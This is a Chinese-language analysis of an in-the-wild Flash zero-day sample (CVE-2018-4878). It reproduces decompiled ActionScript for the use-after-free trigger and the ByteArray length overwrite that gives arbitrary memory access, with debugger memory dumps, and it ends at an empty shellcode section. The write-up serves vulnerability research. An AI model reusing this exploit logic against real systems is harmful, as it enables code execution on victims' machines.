# Flash 0day(CVE-2018-4878)分析记录

拿到sample以后，上FFDEC，看看decompiled code，简单看一下，发现又是TVSDK，看来后面TVSDK还是会有不少洞的。
```action script
   import com.adobe.tvsdk.mediacore.MediaPlayer;
   import com.adobe.tvsdk.mediacore.PSDK;
   import com.adobe.tvsdk.mediacore.PSDKEventDispatcher;
```

先从code层面整理逻辑，class_2可以看做入口函数，通过DRMManager初始化DRM object，来触发漏洞（后面的调试，可以看出这是一个UAF）。
通过计时器来检查DRM object的a1是不是被修改了，如果已经被修改，则去做利用的部分，思路是ByteArray占位，以及修改ByteArray的Length，获取全地址访问的权限。

```action script
      public function class_2(param1:flash01)
      {
         super();
         this.flash01_obj = param1;
         this.method_3();
         try
         {
            var name:* = class_1.method_1(17);
            new LocalConnection().connect(name);
            new LocalConnection().connect(name);
         }
         catch(e:Error)
         {
            drm_obj_2 = new DRMClass();
         }
         this.timer = new Timer(100,1000);
         this.timer.addEventListener(class_1.method_1(33), this.method_2);
         this.timer.start();
      }

      public function method_3() : void
      {
         var psdk:PSDK = null;
         var data14:PSDKEventDispatcher = null;
         psdk = PSDK.pSDK;
         data14 = psdk.createDispatcher();
         this.media_player = psdk.createMediaPlayer(data14);
         this.drm_obj_1 = new DRMClass();
         this.media_player.drmManager.initialize(this.drm_obj_1);
         this.drm_obj_1 = null;
      }

      public function method_2(param1:TimerEvent) : void
      {
         if(this.drm_obj_2.a1 != 4369) // 0x1111
         {
            this.timer.stop();
            if(!Capabilities.isDebugger)
            {
               this.flash25();
            }
            else
            {
               this.flash24();
            }
         }
      }
```

```action script
   public class DRMClass implements DRMOperationCompleteListener
   {
       
      public var a1:uint = 4369; //0x1111
      
      public var a2:uint = 8738; //0x2222
      
      public var a3:uint = 13107; //0x3333
      
      public var a4:uint = 17476; //0x4444
      
      public var a5:uint = 21845; //0x5555
      
      public var a6:uint = 26214; //0x6666
      
      public var a7:uint = 30583; //0x7777
      
      public var a8:uint = 34952; //0x8888
      
      public var a9:uint = 39321; //0x9999
      
      public var a10:uint = 43690; //0xAAAA

      ...
```

在触发漏洞之前，DRM object的内存布局
```
0:005> dd 0706ff70
0706ff70  00001111 00002222 00003333 00004444
0706ff80  00005555 00006666 00007777 00008888
0706ff90  00009999 0000aaaa 00001111 00002222
0706ffa0  00003333 00004444 00005555 00006666
0706ffb0  00007777 00008888 00009999 0000aaaa
0706ffc0  00001111 00002222 00003333 00004444
0706ffd0  00005555 00006666 00007777 00008888
0706ffe0  00009999 0000aaaa 00001111 00002222
```

漏洞触发的时候，可以发现相应的a1已经被设置为0，继续跟进call stack，可以发现前几个function大致是这样的：delete script_object --> script_object destructor --> memset
```
eax=00000000 ebx=07061b80 ecx=00000022 edx=00000000 esi=0000004c edi=0706ff74
eip=6eca81ef esp=02ddd210 ebp=00000000 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210202
Flash32_28_0_0_137!IAEModule_IAEKernel_UnloadModule+0x3695cf:
6eca81ef f3ab            rep stos dword ptr es:[edi]
0:005> dd 0706ff70
0706ff70  00000000 00002222 00003333 00004444
0706ff80  00005555 00006666 00007777 00008888
0706ff90  00009999 0000aaaa 00001111 00002222
0706ffa0  00003333 00004444 00005555 00006666
0706ffb0  00007777 00008888 00009999 0000aaaa
0706ffc0  00001111 00002222 00003333 00004444
0706ffd0  00005555 00006666 00007777 00008888
0706ffe0  00009999 0000aaaa 00001111 00002222
```


```action script
      public function flash25() : void
      {
         // allocate ByteArray object to place freed memory
         this.bae_obj = new ByteArrayExt();
         this.bae_obj.length = 512;
         
         if(this.drm_obj_2.a14 != 0)
         {
            for(var index:int = 0; index < 5; index++)
            {
               this.drm_obj_2.a32 = this.drm_obj_2.a14 + 8 * index + 7;
               this.bae_obj.write_object(index * 2 + 1,this.bae_obj.flash25());
            }
            this.bae_obj.a11 = 0;
            this.var_18 = this.drm_obj_2.a14;
            this.drm_obj_2.a14 = this.drm_obj_2.a31 + 19 * 4 + 16 - 1;
            var key:uint = this.drm_obj_2.a22 ^ this.drm_obj_2.a26;
            this.drm_obj_2.a22 = 0;
            this.drm_obj_2.a23 = 0xffffffff;     // modify lenght/capability of bytearray
            this.drm_obj_2.a24 = 0xffffffff;     // modify lenght/capability of bytearray
            this.drm_obj_2.a26 = this.drm_obj_2.a22 ^ key;
            this.drm_obj_2.a27 = this.drm_obj_2.a23 ^ key;
            this.drm_obj_2.a28 = this.drm_obj_2.a24 ^ key;
            this.drm_obj_2.a29 = this.drm_obj_2.a25 ^ key;
            this.bae_obj.endian = Endian.LITTLE_ENDIAN;
            flash5.flash20(this.bae_obj,this.drm_obj_2);
            this.drm_obj_2.a14 = this.var_18;
            return;
         }
```

占位以后的内存布局，可以看到，length == 0x200
```
0:005> dd 0706ff70
0706ff70  0706ff78 00000044 6f1c1880 6f1c1888
0706ff80  6f1c187c 6f209984 06f4a4c0 08865180
0706ff90  072f5eb0 00000000 00000000 00000008
0706ffa0  6f1d3db0 084ce0b0 00000000 00000000
0706ffb0  6f1c1874 00000003 00000000 6f1c1868
0706ffc0  00000001 074f64a0 [00000200] [00000200]
0706ffd0  00000066 00000077 00000088 00000099
0706ffe0  000000aa 000000bb 0706ff61 084ce0c7
```

修改Lengh以后，对应的内存布局，如下：
```
0:005> dd 0706ff70
0706ff70  0706ff78 00000044 6f1c1880 6f1c1888
0706ff80  6f1c187c 6f209984 06f4a4c0 08865180
0706ff90  072f5eb0 00000000 00000000 00000008
0706ffa0  6f1d3db0 0706ffbc 00000000 00000000
0706ffb0  6f1c1874 00000003 00000000 6f1c1868
0706ffc0  00000001 00000000 [ffffffff] [ffffffff]
0706ffd0  00000000 2520b474 226fd2d4 226fd2d4
0706ffe0  226fd0d4 00000000 0706ff61 084ce0d7
```

相应修改Length的汇编指令以及action script位置，正好可以对应decompiled code中的class_2/flash25
```
overwrite capability of bytearray
eax=2520b474 ebx=bf740880 ecx=226fd0d4 edx=00000000 esi=0703feb0 edi=070fb020
eip=07d22d2e esp=02ddd058 ebp=02ddd100 iopl=0         nv up ei ng nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
07d22d2e 8b461c          mov     eax,dword ptr [esi+1Ch] ds:002b:0703fecc=0706ff60

0:005> !py -g flashext.py --lnjit 0x7d22d2e
List near symbol at: 0x7d22d2e
Find near symbol:
class_2/flash25 (0x7d225b8) | class_2/method_2 (0x7d22e6f)

```

后面就是利用获取的全地址读写来leak kernel32的地址，然后，是VirutualProtect和CreateProcess。

shellcode的执行过程：